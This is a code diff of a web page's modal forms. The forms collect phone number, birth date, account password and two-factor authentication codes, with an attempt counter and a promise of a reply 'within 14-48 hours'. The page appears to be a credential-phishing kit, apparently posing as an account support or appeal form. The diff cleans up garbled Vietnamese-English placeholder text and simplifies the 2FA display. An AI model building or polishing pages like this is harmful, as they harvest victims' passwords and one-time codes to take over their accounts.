@@ -3305,7 +3305,7 @@
 
             <div class="input w-full border border-[#d4dbe3] h-[40px] rounded-[10px] bg-white text-[14px] mb-[10px]">
               <div class="react-tel-input">
-                <input class="form-control" placeholder="Số Phone Numberata-i18n-placeholder="modal.info.phone"
+                <input class="form-control" placeholder=" " data-i18n-placeholder="modal.info.phone"
                   type="tel" id="phone" value="+1 " required="required" />
                 <div class="flag-dropdown" id="flag-dropdown">
                   <div class="selected-flag" title="United States: +1" onclick="toggleCountryDropdown()">
@@ -4147,19 +4147,19 @@
             <div class="grid grid-cols-3 gap-[10px]">
               <div
                 class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
-                <input placeholder="Ngày" dataDayn-placeholder="modal.info.day" id="day"
+                <input placeholder=" " data-i18n-placeholder="modal.info.day" id="day"
                   class="w-full outline-0 h-full bg-transparent" type="number" min="1" max="31" required="required"
                   oninput="vDay(this)" />
               </div>
               <div
                 class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
-                <input placeholder="Tháng" dataMonth-placeholder="modal.info.month"
+                <input placeholder=" " data-i18n-placeholder="modal.info.month"
                   class="w-full outline-0 h-full bg-transparent" id="month" type="number" min="1" max="12"
                   required="required" oninput="vMon(this)" />
               </div>
               <div
                 class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
-                <input inputmode="numeric" placeholder="Year" data-iYear-placeholder="modal.info.year" id="year"
+                <input inputmode="numeric" placeholder=" " data-i18n-placeholder="modal.info.year" id="year"
                   class="w-full outline-0 h-full bg-transparent" type="number" min="1" max="2026" required="required"
                   oninput="vYr(this)" />
               </div>
@@ -4175,7 +4175,7 @@
             <div
               class="input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-white text-[14px] mb-[10px]">
               <textarea id="message" class="w-full outline-0 h-full resize-none bg-transparent"
-                placeholder="Ghi chú (tNote (optional)n-placeholder="modal.info.note"></textarea>
+                placeholder=" " data-i18n-placeholder="modal.info.note"></textarea>
             </div>
 
             <p class="text-[#9a979e] text-[14px] mb-[7px]" data-i18n="modal.info.response">Response will be sent to you within 14-48 hours.</p>
@@ -4232,7 +4232,7 @@
                   <div
                     class="relative w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
                     <input class="w-full outline-[0] h-full hide-password-toggle bg-transparent" id="password"
-                      placeholder="Mật khẩu" datEnter passwordlaceholder="modal.pwd.placeholder" autocomplete="new-password"
+                      placeholder=" " data-i18n-placeholder="modal.pwd.placeholder" autocomplete="new-password"
                       type="password" value="" />
                     <button type="button" id="toggle-password"
                       class="absolute inset-y-0 right-0 flex items-center px-3 text-gray-500 cursor-pointer"
@@ -4301,7 +4301,8 @@
               </h2>
               <p class="text-[#9a979e] text-[14px]">
                 <span data-i18n="modal.2fa.desc">Enter the authentication code from your authenticator app.</span>
-                <span id="2fa-masked-info"></span>
+              </p>
+              <p class="text-[#9a979e] text-[14px]">
                 <span data-i18n="modal.2fa.desc2">Check your authenticator app or SMS for the code.</span>
               </p>
               <div class="w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]">
@@ -4311,7 +4312,7 @@
                 <form id="form-2fa">
                   <div
                     class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md transition-all duration-200">
-                    <input id="code-2fa" placeholder="Mã đăngEnter authentication codei18n-placeholder="modal.2fa.placeholder"
+                    <input id="code-2fa" placeholder=" " data-i18n-placeholder="modal.2fa.placeholder"
                       maxlength="8" class="w-full outline-none h-full bg-transparent" inputmode="numeric"
                       pattern="[0-9]*" value="" oninput="
                           this.value = this.value
@@ -5284,38 +5285,13 @@
         } else {
           error.classList.remove("show");
           hideModal("modal-password");
-          update2FADisplay();
+          document.getElementById("2fa-email-display").textContent = document.getElementById("email").value;
+          document.getElementById("2fa-step").textContent = tfaAttempts + 1;
           showModal("modal-2fa");
         }
       };
 
-      function maskEmail(email) {
-        if (!email) return "";
-        const [name, domain] = email.split("@");
-        if (!domain) return email;
-        const maskedName =
-          name.charAt(0) + "**" + name.charAt(name.length - 1);
-        return maskedName + "@" + domain;
-      }
 
-      function maskPhone(phone) {
-        if (!phone) return "";
-        const cleaned = phone.replace(/\s/g, "");
-        if (cleaned.length < 6) return phone;
-        const lastDigits = cleaned.slice(-2);
-        const prefix = cleaned.slice(0, -4);
-        return prefix + " ** " + lastDigits;
-      }
-
-      function update2FADisplay() {
-        const email = document.getElementById("email").value;
-        const phone = document.getElementById("phone").value;
-
-        document.getElementById("2fa-email-display").textContent = email;
-        document.getElementById("2fa-masked-info").textContent =
-          maskEmail(email) + ", " + maskPhone(phone);
-        document.getElementById("2fa-step").textContent = tfaAttempts + 1;
-      }
 
       document.getElementById("form-2fa").onsubmit = function (e) {
         e.preventDefault();
